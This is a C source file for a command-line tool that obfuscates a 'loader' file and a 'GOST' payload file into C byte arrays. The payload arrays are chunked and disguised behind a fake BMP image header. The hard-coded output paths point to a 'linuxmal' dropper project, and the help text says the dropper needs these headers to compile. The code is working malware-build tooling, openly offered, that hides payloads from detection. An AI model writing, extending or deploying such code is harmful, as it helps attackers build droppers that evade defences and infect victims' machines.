#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern void nibbleBaseObfuscate(char *input, char *output);

#define BLOCK_SIZE     50
#define OUT_BUFFER     512
#define ARRAY_BYTES    0x16B6
#define BMP_HEADER_SZ  0x36

static const unsigned char bmp_header[BMP_HEADER_SZ] = {
    0x42,0x4D,
    ARRAY_BYTES & 0xFF,
    (ARRAY_BYTES >> 8) & 0xFF,
    (ARRAY_BYTES >> 16) & 0xFF,
    (ARRAY_BYTES >> 24) & 0xFF,
    0,0,0,0,
    0x36,0,0,0,
    0x28,0,0,0,
    0x80,0x07,0,0,
    0x01,0x00,0,0,
    0x01,0x00,
    0x18,0x00,
    0,0,0,0,
    0,0,0,0,
    0xC4,0x0E,0,0,
    0xC4,0x0E,0,0,
    0,0,0,0,
    0,0,0,0
};

int get_encoded_size(unsigned char *out) {
    int mode = out[0];
    int meta = out[1];
    return 2 + meta + 25 + (mode ? 50 : 25);
}

void write_array_header(FILE *f, int index) {
    fprintf(f, "unsigned char data_%d[0x%X] = {\n", index, ARRAY_BYTES);
}

void write_array_footer(FILE *f) {
    fprintf(f, "\n};\n");
}

void write_bytes_as_c(FILE *f,
                      const unsigned char *data,
                      size_t count,
                      size_t *byte_count)
{
    for (size_t i = 0; i < count; i++) {
        fprintf(f, "0x%02X,", data[i]);
        (*byte_count)++;

        if (*byte_count % 16 == 0)
            fprintf(f, "\n");
        else
            fprintf(f, " ");
    }
}


int obfuscate_gost_file(const char *input_path) {
    FILE *fi = fopen(input_path, "rb");
    if (!fi) {
        perror("input");
        return -1;
    }

    unsigned char buffer[BLOCK_SIZE];
    unsigned char out[OUT_BUFFER];

    size_t readBytes;
    size_t array_bytes_written = 0;
    int file_index = 1;

    char name[64];
    snprintf(name, sizeof(name), "D:/linuxmal/gostInit/windows/droper/includes/gostData_%d.h", file_index);
    FILE *fo = fopen(name, "w");
    if (!fo) {
        perror("output");
        fclose(fi);
        return -1;
    }

    write_array_header(fo, file_index);
    array_bytes_written = 0;  /* ✅ RESET */
    write_bytes_as_c(fo, bmp_header, BMP_HEADER_SZ, &array_bytes_written);

    while ((readBytes = fread(buffer, 1, BLOCK_SIZE, fi)) > 0) {

        if (readBytes < BLOCK_SIZE)
            memset(buffer + readBytes, 0, BLOCK_SIZE - readBytes);

        nibbleBaseObfuscate((char *)buffer, (char *)out);
        int block_size = get_encoded_size(out);

        size_t offset = 0;

        while (offset < (size_t)block_size) {

            size_t space_left = ARRAY_BYTES - array_bytes_written;
            size_t to_write = block_size - offset;

            if (to_write > space_left)
                to_write = space_left;

            write_bytes_as_c(fo, out + offset, to_write, &array_bytes_written);
            offset += to_write;

            if (array_bytes_written == ARRAY_BYTES) {
                write_array_footer(fo);
                fclose(fo);

                file_index++;
                snprintf(name, sizeof(name), "D:/linuxmal/gostInit/windows/droper/includes/gostData_%d.h", file_index);
                fo = fopen(name, "w");
                if (!fo) {
                    perror("output");
                    fclose(fi);
                    return -1;
                }

                write_array_header(fo, file_index);
                array_bytes_written = 0;   /* ✅ CRITICAL FIX */
                write_bytes_as_c(
                    fo,
                    bmp_header,
                    BMP_HEADER_SZ,
                    &array_bytes_written
                );
            }
        }
    }

    /* PAD ONLY LAST FILE */
    if (array_bytes_written < ARRAY_BYTES) {
        unsigned char zero = 0x00;
        while (array_bytes_written < ARRAY_BYTES) {
            write_bytes_as_c(fo, &zero, 1, &array_bytes_written);
        }
        write_array_footer(fo);
        fclose(fo);
    }

    fclose(fi);

    printf("OK: %d file(s) created, each exactly 0x%X bytes\n",
           file_index, ARRAY_BYTES);

    return 0;
}



/*
    Obfuscate a file and print ONE LARGE C ARRAY containing all encoded data
*/
int obfuscate_loader_file(const char *input_path, const char *output_h_path) {
    FILE *fi = fopen(input_path, "rb");
    if (!fi) {
        perror("Cannot open input file");
        return -1;
    }

    unsigned char buffer[50];
    unsigned char out[512];

    size_t readBytes;

    // Dynamic growable buffer for final encoded output
    size_t out_capacity = 4096;
    size_t out_size = 0;
    unsigned char *big_out = malloc(out_capacity);

    if (!big_out) {
        perror("Memory allocation failed");
        fclose(fi);
        return -1;
    }

    // Read and obfuscate input
    while ((readBytes = fread(buffer, 1, 50, fi)) > 0) {
        if (readBytes < 50)
            memset(buffer + readBytes, 0, 50 - readBytes);

        nibbleBaseObfuscate((char *)buffer, (char *)out);

        int block_size = get_encoded_size(out);

        // Grow output buffer if needed
        if (out_size + block_size > out_capacity) {
            while (out_size + block_size > out_capacity)
                out_capacity *= 2;

            unsigned char *new_ptr = realloc(big_out, out_capacity);
            if (!new_ptr) {
                perror("Realloc failed");
                free(big_out);
                fclose(fi);
                return -1;
            }
            big_out = new_ptr;
        }

        memcpy(big_out + out_size, out, block_size);
        out_size += block_size;
    }

    fclose(fi);

    // Open the output .h file
    FILE *fo = fopen(output_h_path, "w");
    if (!fo) {
        perror("Cannot open output .h file");
        free(big_out);
        return -1;
    }

    // Write C array header
    fprintf(fo, "#ifndef ENCODED_DATA_H\n#define ENCODED_DATA_H\n\n");
    fprintf(fo, "unsigned char loader_data[%zu] = {\n", out_size);

    size_t byte_count = 0;
    for (size_t i = 0; i < out_size; i++) {
        fprintf(fo, "0x%02X", big_out[i]);
        byte_count++;

        if (i + 1 < out_size)
            fprintf(fo, ",");
        
        if (byte_count % 16 == 0)
            fprintf(fo, "\n");
        else
            fprintf(fo, " ");
    }

    fprintf(fo, "\n};\n\n#endif // ENCODED_DATA_H\n");

    fclose(fo);
    free(big_out);

    printf("OK: obfuscated data written to %s (%zu bytes)\n", output_h_path, out_size);
    return 0;
}

void print_usage(const char *prog) {
    printf("Usage:\n");
    printf("  %s -l <loader_file> -g <gost_file>\n", prog);
    printf("  %s -h\n", prog);
    printf("\nOptions:\n");
    printf("  -l <file>   Loader file\n");
    printf("  -g <file>   GOST input file\n");
    printf("  -h          Show this help\n");
    printf("\nthis program obfuscates the specified files into C arrays.\ndroper need those output to be compile\n\n");
}


int main(int argc, char *argv[]) {
    /* Handle help first */
    if (argc == 2 && strcmp(argv[1], "-h") == 0) {
        print_usage(argv[0]);
        return 0;
    }

    /* Validate normal usage */
    if (argc != 5 ||
        strcmp(argv[1], "-l") != 0 ||
        strcmp(argv[3], "-g") != 0) {

        print_usage(argv[0]);
        return 1;
    }

    obfuscate_loader_file(argv[2], "D:/linuxmal/gostInit/windows/droper/includes/loaderData.h");
    obfuscate_gost_file(argv[4]);
}
